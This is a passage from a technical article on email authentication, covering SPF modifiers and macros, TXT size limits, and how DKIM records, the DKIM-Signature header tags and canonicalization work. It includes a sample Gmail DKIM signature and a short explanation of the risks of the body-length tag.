It goes without saying that you should authorize only <abbr title="Internet Protocol">IP</abbr> addresses
which belong to you or which send emails on your behalf.</p>

</details>

<details>
  <summary id="spf-modifiers">
<abbr title="Sender Policy Framework">SPF</abbr> modifiers
</summary>

  <p><a href="https://datatracker.ietf.org/doc/html/rfc7208#section-6"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 7208</a> defines two modifiers,
which affect the evaluation of <abbr title="Sender Policy Framework">SPF</abbr> records outside the matching behavior of <a href="#spf-mechanisms">mechanisms</a>:</p>
  <ul>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc7208#section-6.1"><code>redirect</code></a>
tells the <abbr title="Sender Policy Framework">SPF</abbr> verifier to continue the evaluation with the <abbr title="Sender Policy Framework">SPF</abbr> record of a different domain
if no mechanism in the current <abbr title="Sender Policy Framework">SPF</abbr> record matched the sender’s <abbr title="Internet Protocol">IP</abbr> address.
The target domain is provided after an equals sign, such as <code>redirect=_spf.example.com</code>.
Unlike the <code>include</code> mechanism, which produces a match if the included <abbr title="Sender Policy Framework">SPF</abbr> record results in a <code>pass</code>,
the <code>redirect</code> modifier adopts the result of the redirected <abbr title="Sender Policy Framework">SPF</abbr> record as the result of the original record.</li>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc7208#section-6.2"><code>exp</code></a>
allows the domain owner to specify an explanation for a <code>fail</code> result.
If you include <code>exp=_exp.example.com</code> in your <abbr title="Sender Policy Framework">SPF</abbr> record,
the <abbr title="Sender Policy Framework">SPF</abbr> verifier looks for a <code>TXT</code> record at <code>_exp.example.com</code>
and returns its data to the sender in the case of a <code>fail</code> result.
This <abbr title="Domain Name System">DNS</abbr> query doesn’t count towards the <a href="https://datatracker.ietf.org/doc/html/rfc7208#section-4.6.4">lookup limit</a> of 10.</li>
  </ul>

  <p>Modifiers should appear at the end of an <abbr title="Sender Policy Framework">SPF</abbr> record but can appear anywhere.
Unknown modifiers have to be ignored so that <abbr title="Sender Policy Framework">SPF</abbr> can be extended in the future.
You can use any domain name in these modifiers, <code>_spf</code> and <code>_exp</code> have no special meaning.</p>

</details>

<details>
  <summary id="spf-macros">
<abbr title="Sender Policy Framework">SPF</abbr> macros
</summary>

  <p>Instead of using a domain name after the <code>a</code>, <code>mx</code>, <code>include</code>, <code>exists</code>, and <code>ptr</code> <a href="#spf-mechanisms">mechanisms</a>
or the <code>redirect</code> and <code>exp</code> <a href="#spf-modifiers">modifiers</a>, you can use an <abbr title="Sender Policy Framework">SPF</abbr> macro.
<abbr title="Sender Policy Framework">SPF</abbr> macros are domains, where expressions of the form <code>%{…}</code> are replaced
with information from the <abbr title="Simple Mail Transfer Protocol">SMTP</abbr> session.
Since the <a href="#tool-lookup-spf-record">above tool</a> doesn’t have this information, it cannot evaluate macros.
If you want to use <abbr title="Sender Policy Framework">SPF</abbr> macros, you have to read the <a href="https://datatracker.ietf.org/doc/html/rfc7208#section-7"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr></a>.
Let me just give you <a href="https://datatracker.ietf.org/doc/html/rfc7208#appendix-D.1">one example</a>:
If you are worried about breaking <a href="#email-forwarding">email forwarding</a> when using <abbr title="Sender Policy Framework">SPF</abbr>,
you can specify a <code>neutral</code> result for trusted mail servers by including
<code>?exists:%{ir}.whitelist.example.org</code> in your <abbr title="Sender Policy Framework">SPF</abbr> record.
<code>i</code> stands for the sender’s <abbr title="Internet Protocol">IP</abbr> address and <code>r</code> reverses the value, splitting on dots by default.
<a href="https://datatracker.ietf.org/doc/html/rfc7208#appendix-D.1">Other use cases of macros</a> are to provide
a different policy for each user or to rate-limit messages coming from certain <abbr title="Internet Protocol">IP</abbr> addresses.
Macros can cause problems with <a href="#email-address-internationalization">internationalized email addresses</a>
as discussed in <a href="https://datatracker.ietf.org/doc/html/rfc8616#section-4"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 8616</a>
and aggravate <a href="#privacy-implications">privacy implications</a> by
<a href="https://datatracker.ietf.org/doc/html/rfc7208#appendix-C">leaking sender addresses into the <abbr title="Domain Name System">DNS</abbr></a>.
Such a tracking example can be found at <a href="#tool-lookup-spf-record&amp;domain=altavista.net" title="Look up the SPF record of altavista.net."><code>altavista.net</code></a>.</p>

</details>

<details>
  <summary id="helo-identity">
HELO identity
</summary>

  <p>In order to prevent <a href="#mail-loops">mail loops</a>,
no <code>MAIL</code> <code>FROM</code> address is provided in <a href="#automatic-responses">automatic responses</a>.
In such circumstances, the address <code>postmaster@</code> followed by the domain from the
<a href="https://datatracker.ietf.org/doc/html/rfc7208#section-1.1.4"><code>HELO</code>/<code>EHLO</code> command</a> is used for <abbr title="Sender Policy Framework">SPF</abbr> evaluation.
The <a href="https://datatracker.ietf.org/doc/html/rfc7208#section-2.3"><code>HELO</code> identity</a> can also be verified separately
by evaluating the <abbr title="Sender Policy Framework">SPF</abbr> record of the <code>HELO</code>/<code>EHLO</code> domain.
Mailbox providers would have to configure <abbr title="Sender Policy Framework">SPF</abbr> records for each of their outgoing mail servers.
As far as I can tell, this is rarely done in practice.
I found <abbr title="Sender Policy Framework">SPF</abbr> records only for the outgoing mail servers of Outlook.com.
Unless you run your mail servers yourself, this aspect of <abbr title="Sender Policy Framework">SPF</abbr> is nothing to worry about.</p>

</details>

<details>
  <summary id="txt-size-limits">
TXT size limits
</summary>

  <p><abbr title="Domain Name System">DNS</abbr> queries and replies use the <a href="https://evalapply.org/internet/#user-datagram-protocol">User Datagram Protocol (UDP)</a> when possible
and fall back on the <a href="https://evalapply.org/internet/#transmission-control-protocol">Transmission Control Protocol (<abbr title="Transmission Control Protocol">TCP</abbr>)</a>
on the <a href="https://evalapply.org/internet/#transport-layer">transport layer</a> if necessary.
Since UDP is a <a href="https://en.wikipedia.org/wiki/Connectionless_communication">connectionless communication protocol</a>,
no additional messages have to be sent back and forth to set up the connection, which makes it more efficient than
<a href="https://en.wikipedia.org/wiki/Transmission_Control_Protocol#Connection_establishment"><abbr title="Transmission Control Protocol">TCP</abbr> with its handshake</a>.
Historically, UDP messages were <a href="https://datatracker.ietf.org/doc/html/rfc1035#section-2.3.4">limited to 512 bytes</a>.
This limit was raised <a href="https://datatracker.ietf.org/doc/html/rfc2671#section-4.5">in 1999</a> with the introduction
of the <a href="https://en.wikipedia.org/wiki/Extension_Mechanisms_for_DNS">Extension Mechanisms for <abbr title="Domain Name System">DNS</abbr> (<abbr title="Extension Mechanisms for DNS">EDNS</abbr>)</a>.
<abbr title="Extension Mechanisms for DNS">EDNS</abbr> allows the sender to indicate a higher UDP payload size in a so-called
<a href="https://datatracker.ietf.org/doc/html/rfc6891#section-6">pseudo resource record</a> of the type <code>OPT</code>.
The command-line tool <a href="https://en.wikipedia.org/wiki/Dig_(command)"><code>dig</code></a> displays this <code>OPT</code> record as follows:</p>

  <figure>
    
    <figcaption>

How <code>dig</code> displays the <code>OPT</code> pseudo resource record.
<code>dig</code> increases the UDP payload limit to 4096.
As you can also see, <code>dig</code> sets the <code>do</code> (<abbr title="Domain Name System Security Extensions">DNSSEC</abbr> <abbr title="okay">OK</abbr>) flag of <abbr title="Extension Mechanisms for DNS">EDNS</abbr> there
to ask for <a href="https://evalapply.org/internet/#domain-name-system-security-extensions"><abbr title="Domain Name System Security Extensions">DNSSEC</abbr></a> records.

</figcaption>
  </figure>

  <p>As an ordinary domain administrator, you likely don’t have to worry about these size limits.
If you operate a large email service or run into problems with certain providers,
it can make sense to split a large <abbr title="Sender Policy Framework">SPF</abbr> record into several smaller ones, though.</p>

  <p>There is another limit in <abbr title="Domain Name System">DNS</abbr>: Each character string is
<a href="https://datatracker.ietf.org/doc/html/rfc1035#section-3.3">limited to 255 bytes</a>.
A <a href="https://datatracker.ietf.org/doc/html/rfc1035#section-3.3.14"><code>TXT</code> resource record</a>
can consist of several such strings, though.
<abbr title="Sender Policy Framework">SPF</abbr> verifiers <a href="https://datatracker.ietf.org/doc/html/rfc7208#section-3.3">concatenate such strings</a> without inserting any spaces.
If the user interface of your <a href="https://en.wikipedia.org/wiki/Domain_name_registrar">domain name registrar</a>
splits longer strings for you, you don’t have to worry about this size limit either.</p>

</details>

<details>
  <summary id="spf-record-type">
<abbr title="Sender Policy Framework">SPF</abbr> record type
</summary>

  <p>There used to be an <code>SPF</code> record type for publishing <abbr title="Sender Policy Framework">SPF</abbr> records,
but since this type never gained enough traction,
it was discontinued in favor of the unstructured <code>TXT</code> record type.
Nowadays, <abbr title="Sender Policy Framework">SPF</abbr> records <a href="https://datatracker.ietf.org/doc/html/rfc7208#section-3.1">have to be published in <code>TXT</code> records</a>.</p>

</details>

<h4 id="domainkeys-identified-mail">DomainKeys Identified Mail (<abbr title="DomainKeys Identified Mail">DKIM</abbr>)</h4>

<p><a href="https://en.wikipedia.org/wiki/DomainKeys_Identified_Mail">DomainKeys Identified Mail (<abbr title="DomainKeys Identified Mail">DKIM</abbr>)</a>
is specified in <a href="https://datatracker.ietf.org/doc/html/rfc6376"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 6376</a>.
(<a href="https://en.wikipedia.org/wiki/DomainKeys">DomainKeys</a> was a predecessor
designed by <a href="https://en.wikipedia.org/wiki/Yahoo">Yahoo</a>,
and the name survived the <abbr title="Internet Engineering Task Force">IETF</abbr> standardization process.)
<abbr title="DomainKeys Identified Mail">DKIM</abbr> allows a domain owner to take responsibility for a message
by signing its body and selected header fields.
Any mail server through which a message passes can add a <abbr title="DomainKeys Identified Mail">DKIM</abbr> signature.
Unlike <a href="#comparison-of-smime-and-pgp"><abbr title="Secure/Multipurpose Internet Mail Extensions">S/MIME</abbr> and <abbr title="Pretty Good Privacy">PGP</abbr></a>, which alter the body of a message,
<abbr title="DomainKeys Identified Mail">DKIM</abbr> signatures are added in a new header field,
which makes them unobtrusive for users whose mail clients don’t support <abbr title="DomainKeys Identified Mail">DKIM</abbr>.
Also unlike <abbr title="Secure/Multipurpose Internet Mail Extensions">S/MIME</abbr> and <abbr title="Pretty Good Privacy">PGP</abbr>, <abbr title="DomainKeys Identified Mail">DKIM</abbr> uses the <a href="https://evalapply.org/internet/#domain-name-system">Domain Name System</a>
as its <a href="https://evalapply.org/internet/#public-key-infrastructure">public-key infrastructure</a>,
which is secure only in combination with <a href="https://evalapply.org/internet/#domain-name-system-security-extensions"><abbr title="Domain Name System Security Extensions">DNSSEC</abbr></a>.
The owner of a domain can publish several <a href="https://evalapply.org/internet/#digital-signatures">public keys</a>
so that different servers can use different <a href="https://evalapply.org/internet/#digital-signatures">private keys</a> for signing.
The ability to publish several keys is also useful for introducing a new key before revoking an old one.
Each public key is identified by a unique <code>Selector</code> within its <code>Domain</code>
and is published in a <code>TXT</code> record at <code>{Selector}._domainkey.{Domain}</code>.
The selector can contain periods, which allows large organizations to split the namespace
of their <abbr title="DomainKeys Identified Mail">DKIM</abbr> keys into several <a href="https://en.wikipedia.org/wiki/DNS_zone">administrative zones</a>.
Both the <code>Domain</code> and the <code>Selector</code> are included in the
<a href="#dkim-signature-header-field"><code>DKIM-Signature</code> header field</a>
so that verifiers know how to retrieve the appropriate public key.
Since the public key used to verify a signature is retrieved from the stated domain,
a valid <abbr title="DomainKeys Identified Mail">DKIM</abbr> signature authenticates this domain.</p>

<p>The standard <a href="https://datatracker.ietf.org/doc/html/rfc6376#section-5.1">doesn’t specify</a>
which <a href="#entities">entities</a> add and verify <abbr title="DomainKeys Identified Mail">DKIM</abbr> signatures.
Since <abbr title="DomainKeys Identified Mail">DKIM</abbr> keys are valid for the whole domain and cannot be restricted to individual users,
messages are usually signed by the outgoing mail server after authenticating the user.
If you are the only user of your domain and your mailbox provider doesn’t support <abbr title="DomainKeys Identified Mail">DKIM</abbr>,
you could add a <abbr title="DomainKeys Identified Mail">DKIM</abbr> signature to a message before submitting it to the outgoing mail server,
but I’m not aware of any mail client which supports this.
Since <abbr title="DomainKeys Identified Mail">DKIM</abbr> keys can be revoked at any time after a message has been delivered,
<abbr title="DomainKeys Identified Mail">DKIM</abbr> signatures are typically verified by incoming mail servers, which record the result in the
<a href="#authentication-results-header-field"><code>Authentication-Results</code> header field</a> for later use.
While the mail client of the recipient could verify <abbr title="DomainKeys Identified Mail">DKIM</abbr> signatures as well,
it would have to record the result before the public key expires.
Since emails are usually synchronized to new mail clients via <a href="#internet-message-access-protocol"><abbr title="Internet Message Access Protocol">IMAP</abbr></a>,
the <abbr title="DomainKeys Identified Mail">DKIM</abbr>-verifying mail client would have to replace the messages in the user’s remote mailbox for archiving.
As noted <a href="#confidentiality-and-integrity">earlier</a>, Gmail displays the domain which signed a message.
Similar functionality can be added to Thunderbird through
<a href="https://addons.thunderbird.net/en-US/thunderbird/addon/dkim-verifier/">an add-on</a>.
Another reason for verifying <abbr title="DomainKeys Identified Mail">DKIM</abbr> signatures on incoming mail servers is
to filter spam and phishing emails before they reach the user’s mailbox.
<abbr title="DomainKeys Identified Mail">DKIM</abbr> doesn’t specify how to handle messages which don’t have a valid signature from a suitable domain.
It simply allows the recipient to use the <a href="#reputation">reputation of a domain</a> to assess a given message.
How a domain owner can ask recipients to reject emails which don’t pass domain authentication
is the topic of the <a href="#domain-based-message-authentication-reporting-and-conformance">next subsection</a>.</p>

<p>If your mailbox provider supports <abbr title="DomainKeys Identified Mail">DKIM</abbr> for custom domains,
it likely has an article on how to generate a <abbr title="DomainKeys Identified Mail">DKIM</abbr> key for your domain
and how to publish the public key in your <abbr title="Domain Name System">DNS</abbr> zone.
For example, <a href="https://support.google.com/a/answer/174124">this guide</a>
shows you how to set up <abbr title="DomainKeys Identified Mail">DKIM</abbr> for <a href="https://workspace.google.com/">Google Workspace</a>.
If you have to generate the signing key yourself,
you find the instructions to do so <a href="#generating-the-signing-key">below</a>.
The following two tools help you generate and validate <abbr title="DomainKeys Identified Mail">DKIM</abbr> records.
Instead of explaining the various configuration options here,
you can simply hover your mouse over them to read a short description
of their purpose in a <a href="https://en.wikipedia.org/wiki/Tooltip">tooltip</a>.
For a longer explanation, you can consult <a href="https://datatracker.ietf.org/doc/html/rfc6376#section-3.6.1"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 6376</a>.
The last three options are rarely used and just there for the sake of completeness.
When <a href="https://en.wikipedia.org/wiki/RSA_(cryptosystem)"><abbr title="Rivest, Shamir, Adleman (the name of a popular cryptosystem)">RSA</abbr></a> is used as the signing algorithm,
the <abbr title="DomainKeys Identified Mail">DKIM</abbr> record can become quite long,
which requires that the user interface of your domain name registrar
splits the <code>TXT</code> data into strings of <a href="#txt-size-limits">at most 255 bytes</a> for you.
Unlike <a href="#sender-policy-framework"><abbr title="Sender Policy Framework">SPF</abbr></a> and <a href="#domain-based-message-authentication-reporting-and-conformance"><abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr></a>,
you don’t have to configure a <abbr title="DomainKeys Identified Mail">DKIM</abbr> record for unused domains.
Only if you have a wildcard <code>CNAME</code> record and don’t trust the target domain not to spoof emails,
you should configure a <code>TXT</code> record with a value of <code>v=DKIM1; p=</code> at <code>*._domainkey</code> in your <abbr title="Domain Name System">DNS</abbr> zone.
The second tool uses <a href="https://developers.google.com/speed/public-dns/docs/doh/json">Google’s <abbr title="Domain Name System">DNS</abbr> <abbr title="Application Programming Interface">API</abbr></a>
to query the <abbr title="DomainKeys Identified Mail">DKIM</abbr> records.
If it finds a record, it loads its content into the first tool
to make it easier to analyze and modify existing <abbr title="DomainKeys Identified Mail">DKIM</abbr> records.</p>




<details>
  <summary id="non-repudiation">
Non-repudiation
</summary>

  <p>Unlike the sender’s <abbr title="Internet Protocol">IP</abbr> address, which can be verified only by the first incoming mail server,
<a href="https://evalapply.org/internet/#digital-signatures">ordinary digital signatures</a> can be verified by anyone.
In comparison with <a href="#sender-policy-framework"><abbr title="Sender Policy Framework">SPF</abbr></a>,
<abbr title="DomainKeys Identified Mail">DKIM</abbr> has the advantage that <a href="#email-forwarding">email forwarding</a> due to
<a href="#alias-address">alias addresses</a> no longer breaks domain authentication.
Unless a message has been modified by the relaying mail server,
the final recipient can still verify the authenticity of the message.
Another consequence of using digital signatures is that senders can
<a href="https://en.wikipedia.org/wiki/Non-repudiation">no longer repudiate</a> their messages.
If a dispute arises from an oral conversation, it’s one person’s word against another person’s word.
For modern email, this is no longer the case, and many people aren’t aware of this.
I don’t know whether <abbr title="DomainKeys Identified Mail">DKIM</abbr> signatures would make much of a difference if an email dispute comes before a court.
In the world of politics, however, the ability to cast or eliminate doubt can make a big difference.
For example, when <a href="https://en.wikipedia.org/wiki/Podesta_emails">WikiLeaks released personal emails</a>
of <a href="https://en.wikipedia.org/wiki/John_Podesta">John Podesta</a>,
the chairman of <a href="https://en.wikipedia.org/wiki/Hillary_Clinton_2016_presidential_campaign">Hillary Clinton’s 2016 presidential campaign</a>,
<abbr title="DomainKeys Identified Mail">DKIM</abbr> signatures proved the <a href="https://www.wikileaks.org/DKIM-Verification.html">authenticity of emails</a>
which leading Democrats claimed to be fabricated by Russian intelligence agencies.
On the other hand, signing all outgoing emails makes it more difficult for others
to frame you for things that you’ve never written.
While nothing speaks against deploying <a href="#sender-policy-framework"><abbr title="Sender Policy Framework">SPF</abbr></a> and
<a href="#domain-based-message-authentication-reporting-and-conformance"><abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr></a>,
you should think twice about introducing <abbr title="DomainKeys Identified Mail">DKIM</abbr> and consult your legal department before doing so.
If you use a large email service such as Gmail, Outlook.com, or Yahoo Mail,
the provider has made the decision for you.
Since they can be forced to reveal evidence anyway,
you shouldn’t be using them in the first place if you care about
<a href="https://en.wikipedia.org/wiki/Plausible_deniability">plausible deniability</a>.
Instead of hosting your emails yourself, you should rather use an
<a href="https://en.wikipedia.org/wiki/Off-the-Record_Messaging">off-the-record messaging protocol</a>
like <a href="https://en.wikipedia.org/wiki/Signal_Protocol">Signal</a>,
which implements <a href="https://en.wikipedia.org/wiki/Deniable_authentication">deniable authentication</a>.</p>

</details>

<details>
  

  <p>Each <abbr title="DomainKeys Identified Mail">DKIM</abbr> signature is added in a <a href="https://datatracker.ietf.org/doc/html/rfc6376#section-3.5"><code>DKIM-Signature</code> header field</a>,
which consists of <code>name=value</code> pairs separated by a semicolon.
Let’s look at an example before we discuss the various tags and their values:</p>

  <figure>

    <div><div><pre><code>DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=mime-version:from:date:message-id:subject:to;
        bh=HM9brgzIS3y+e9+sDmAHassF4IPPotkzbGUPemyxbZY=;
        b=Lx1FORL1tK47ZvPK+cDr8BRAUp+fZe1RZaxlQ4hp4qfk7jswXVcSxvntyD3VeclxiK
         XXV9BblWoFkyth3u0LTavPTr2wOHb3m2IrubMIJsTsttzaV9XNsECLI2kGOSiiOSsj19
         +ZHC+Ne7+piXyzhgOGiWYDqqSfN9jmQeKKJuZLTXUOsL/UFNKzUfNdPABpcg8dlZOClR
         s/4u++5Zbj8T4fjp1kma+X9q+fKv5oWuYI4BbhQ6ie8g58XRidRowLZTiydocfoRC93x
         UT00JSZr4RAOEyDa5ViJTUwdzkNA6AlokRJ6JYAHoAIXtTSIFnymXjVZcBMUTMYOHozu
         6SOA==
</code></pre></div>    </div>

    <figcaption>

An example <code>DKIM-Signature</code> header field from a message sent with Gmail.

</figcaption>
  </figure>

  <figure>

    <table>
      <thead>
        <tr>
          <th>Tag</th>
          <th>Necessity</th>
          <th>Description</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td><code>v</code></td>
          <td>required</td>
          <td>The used version of the <abbr title="DomainKeys Identified Mail">DKIM</abbr> specification. The current version is <code>1</code>.</td>
        </tr>
        <tr>
          <td><code>a</code></td>
          <td>required</td>
          <td>The signature algorithm. The value is <code>rsa-sha256</code> or <code>ed25519-sha256</code> as introduced in <a href="https://datatracker.ietf.org/doc/html/rfc8463"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 8463</a>.</td>
        </tr>
        <tr>
          <td><code>c</code></td>
          <td>optional</td>
          <td>The <a href="#body-and-header-canonicalization">canonicalization</a> of the header fields and the body separated by a slash. Either <code>simple</code> or <code>relaxed</code>.</td>
        </tr>
        <tr>
          <td><code>d</code></td>
          <td>required</td>
          <td>The domain of the signer.</td>
        </tr>
        <tr>
          <td><code>s</code></td>
          <td>required</td>
          <td>The selector, which identifies the used key.</td>
        </tr>
        <tr>
          <td><code>h</code></td>
          <td>required</td>
          <td>A colon-separated list of the names of the header fields which are covered by the signature.</td>
        </tr>
        <tr>
          <td><code>bh</code></td>
          <td>required</td>
          <td>The Base64-encoded hash of the canonicalized message body (see <a href="#body-and-header-canonicalization">below</a>).</td>
        </tr>
        <tr>
          <td><code>b</code></td>
          <td>required</td>
          <td>The Base64-encoded signature (see the text below this table for how the signed hash is determined).</td>
        </tr>
      </tbody>
      <tbody>
        <tr>
          <td><code>l</code></td>
          <td>optional</td>
          <td>How many bytes of the canonicalized message body are hashed (see <a href="#allow-others-to-extend-the-body">below</a>).</td>
        </tr>
        <tr>
          <td><code>i</code></td>
          <td>optional</td>
          <td>The email address for which the signer takes responsibility (see <a href="#signing-messages-of-subdomains">below</a>).</td>
        </tr>
        <tr>
          <td><code>t</code></td>
          <td>optional</td>
          <td>The <a href="#unix-time">Unix time</a> of when the signature was created.</td>
        </tr>
        <tr>
          <td><code>x</code></td>
          <td>optional</td>
          <td>The <a href="#unix-time">Unix time</a> of when the signature expires.</td>
        </tr>
      </tbody>
    </table>

    <figcaption>

The various tags of the <code>DKIM-Signature</code> header field. The last four tags are less common.
The <a href="https://www.iana.org/assignments/dkim-parameters/dkim-parameters.xhtml"><abbr title="Internet Assigned Numbers Authority">IANA</abbr> registry</a> lists even more tags.

</figcaption>
  </figure>

  <p>There’s one tag we need to have a closer look at: <code>h</code>.
Since the mail servers through which an email passes add additional header fields
for <a href="#trace-information">message tracing</a>, <a href="#mail-loops">mail loop prevention</a>, and <a href="#spam">spam assessment</a>,
<abbr title="DomainKeys Identified Mail">DKIM</abbr> signatures cannot cover all header fields as they would be invalidated immediately otherwise.
<abbr title="DomainKeys Identified Mail">DKIM</abbr> lets the signer decide <a href="https://datatracker.ietf.org/doc/html/rfc6376#section-5.4">which header fields it wants to sign</a>.
The signer then lists the names of all the header fields it wants to sign in the <code>h</code> tag
in the order in which they are to be fed into the <a href="#cryptographic-hash-functions">cryptographic hash function</a>.
The <code>From</code> header field has to be in the list, and the <code>DKIM-Signature</code> header field which is being generated
may not be included as it’s fed into the hash function with an empty <code>b</code> tag implicitly.
The header field names in the <code>h</code> tag are case-insensitive,
and the same name may appear in the list several times.
The first occurrence of a header field name refers to the last header field with the same name in the message,
the second occurrence to the second last header field, and so on.
The <code>h</code> tag can list header fields which don’t appear in the message.
If this is the case, nothing is fed into the hash function,
which means that no such header field can be added without invalidating the <abbr title="DomainKeys Identified Mail">DKIM</abbr> signature.
Since the hash of the message body is included in the <code>bh</code> tag of the <code>DKIM-Signature</code> header field,
it isn’t fed into the hash function separately,
which is clarified in <a href="https://www.rfc-editor.org/errata/eid5252">this errata</a>.</p>

  <p>Since <abbr title="DomainKeys Identified Mail">DKIM</abbr> signatures guarantee the authenticity of a message,
all header fields which affect how the message is displayed to the recipient should be signed.
I have no idea why Gmail signs the <a href="#content-encoding"><code>MIME-Version</code> header field</a>
but not the <a href="#content-type"><code>Content-Type</code> header field</a>.
The latter is much more important as it includes the <a href="#multipart-messages">multipart type</a>
as well as the <a href="#boundary-delimiter">boundary delimiter</a>.
Moreover, Gmail includes the <a href="#recipients"><code>Cc</code> header field</a> in the <code>h</code> tag
only if the message has <code>Cc</code> recipients.
By not always including <code>Cc</code> (and <code>Bcc</code>) in the list of signed header fields,
such a field can be added by a relaying mail server without invalidating the signature.
Header fields like <a href="#sender-field"><code>Sender</code></a> and <a href="#sender"><code>Reply-To</code></a>
should also always be included in order to prevent others from adding them.
Outlook.com and Yahoo Mail are almost as bad as Gmail in this regard.
Unlike Gmail, Outlook.com’s <abbr title="DomainKeys Identified Mail">DKIM</abbr> signature also covers the <code>Content-Type</code>,
whereas Yahoo Mail includes the inexistent <code>Reply-To</code> header field.
On a more positive note, Mailchimp signs the <a href="#one-click-unsubscribe"><code>List-Unsubscribe</code> header field</a>
as recommended by <a href="https://datatracker.ietf.org/doc/html/rfc6376#section-5.4.1"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 6376</a>.</p>

  <p>Many header fields may appear <a href="https://datatracker.ietf.org/doc/html/rfc5322#page-21">at most once</a> in valid messages.
As long as <abbr title="DomainKeys Identified Mail">DKIM</abbr> verifiers ignore <abbr title="DomainKeys Identified Mail">DKIM</abbr> signatures
<a href="https://datatracker.ietf.org/doc/html/rfc6376#section-3.8">on invalid messages</a>,
header fields like <code>From</code> and <code>To</code> don’t need to be included twice in the <code>h</code> tag.</p>

</details>

<details>
  <summary id="body-and-header-canonicalization">
Body and header canonicalization
</summary>

  <p>Besides adding additional header fields, some mail servers also modify emails in other ways.
If the verifier doesn’t feed exactly the same content into the hash function as the signer,
the signature is seen as invalid.
Since <abbr title="DomainKeys Identified Mail">DKIM</abbr> signatures can break due to no fault of the signer,
messages with only invalid signatures should not be treated differently from messages with no signatures at all.
To make <abbr title="DomainKeys Identified Mail">DKIM</abbr> signatures more robust,
<a href="https://datatracker.ietf.org/doc/html/rfc6376#section-3.4"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 6376</a> defines four algorithms to
<a href="https://en.wikipedia.org/wiki/Canonicalization">canonicalize</a> the inputs to the hash function:</p>
  <ul>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc6376#section-3.4.3"><code>simple</code> body canonicalization</a>:
Make sure that the body ends with a single <a href="#newline-characters"><code>{CR}{LF}</code></a>.
If the body ends with several <code>{CR}{LF}</code>, convert them to one.
If there is no <code>{CR}{LF}</code> at the end of the body, insert one.</li>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc6376#section-3.4.4"><code>relaxed</code> body canonicalization</a>:
Delete spaces and tabs before <code>{CR}{LF}</code>,
reduce all sequences of <a href="https://en.wikipedia.org/wiki/Whitespace_character">whitespace</a> within a line to a single space,
and apply the <code>simple</code> body canonicalization with the exception that an empty body remains empty.</li>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc6376#section-3.4.1"><code>simple</code> header canonicalization</a>:
Don’t change header fields in any way.</li>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc6376#section-3.4.2"><code>relaxed</code> header canonicalization</a>:
Convert header field names to lowercase, <a href="#line-length-limit">unfold</a> folded lines,
remove any whitespace characters around the colons which separate the name of a header field from its value,
and apply the <code>relaxed</code> body canonicalization to each header field.</li>
  </ul>

  <p>The signer can decide how to canonicalize the header fields and the body.
The format of the <code>c</code> tag is <code>{HeaderCanonicalization}/{BodyCanonicalization}</code>,
and its default value is <code>simple/simple</code>.</p>

</details>

<details>
  <summary id="allow-others-to-extend-the-body">
Allow others to extend the body
</summary>

  <p>The <code>l</code> tag limits how many bytes of the canonicalized body are included in the body hash,
which is stored in the <code>bh</code> tag of the <a href="#dkim-signature-header-field"><code>DKIM-Signature</code> header field</a>.
The idea is that the signer can allow others to extend the current message body
so that <a href="#mailing-list">mailing lists</a> which add an unsubscribe footer don’t invalidate the signature.
Unfortunately, there are three problems with this idea:</p>
  <ul>
    <li><strong>Applicability</strong>: <abbr title="DomainKeys Identified Mail">DKIM</abbr> is not <abbr title="Multipurpose Internet Mail Extensions">MIME</abbr>-aware.
Anything you add to a <a href="#multipart-messages">multipart message</a>
after the last <a href="#boundary-delimiter">boundary delimiter</a> is part of the epilogue and won’t be shown to the user.
Additionally, many mailing lists also modify the <code>Subject</code> line.</li>
    <li><strong>Usability</strong>: It’s not clear how partial authenticity can be conveyed to the user without causing confusion.</li>
    <li><strong>Security</strong>: If the <code>l</code> tag is not used with utmost care,
an attacker might be able to alter the original message in unexpected ways.
For example, if the <a href="#content-type"><code>Content-Type</code> header field</a> is not included in the <code>h</code> tag,
an attacker can move the original message into the preamble
by changing the <a href="#boundary-delimiter">boundary delimiter</a>.
If the content is a simple <a href="#html-emails"><abbr title="HyperText Markup Language">HTML</abbr> message</a>,
mail clients have to be strict in how they parse the message
to prevent <a href="#quoting-html-messages">content overlays</a>.</li>
  </ul>

  <p>For these reasons, <abbr title="DomainKeys Identified Mail">DKIM</abbr> verifiers <a href="https://datatracker.ietf.org/doc/html/rfc6376#section-8.2">may ignore</a>
signatures which use the <code>l</code> tag.</p>

</details>

<details>
  <summary id="signing-messages-of-subdomains">
Signing messages of subdomains
</summary>

  <p>Signers can specify in the <code>i</code> tag of the <a href="#dkim-signature-header-field"><code>DKIM-Signature</code> header field</a>
the identity of the user on whose behalf they sign.
The <code>i</code> tag has the same format as an email address.
The domain part of the <code>i</code> tag has to be the same domain as specified in the <code>d</code> tag or a subdomain thereof.
Unlike the domain in the <code>d</code> tag, the domain part of the <code>i</code> tag doesn’t have to exist in the <abbr title="Domain Name System">DNS</abbr>
and the local part of the <code>i</code> tag doesn’t have to be associated with any mailbox.
This allows parent domains <a href="https://datatracker.ietf.org/doc/html/rfc6376#section-3.10">to sign on behalf of subdomains</a>
without having to publish the <abbr title="DomainKeys Identified Mail">DKIM</abbr> keys also at the subdomains.
However, there’s no reason to use the <code>i</code> tag for emails since
<a href="#domain-based-message-authentication-reporting-and-conformance"><abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr></a>
<a href="https://datatracker.ietf.org/doc/html/rfc7489#section-3.1.1">ignores the <code>i</code> tag</a>.</p>

</details>

<details>
  <summary id="replay-attacks-for-spamming">
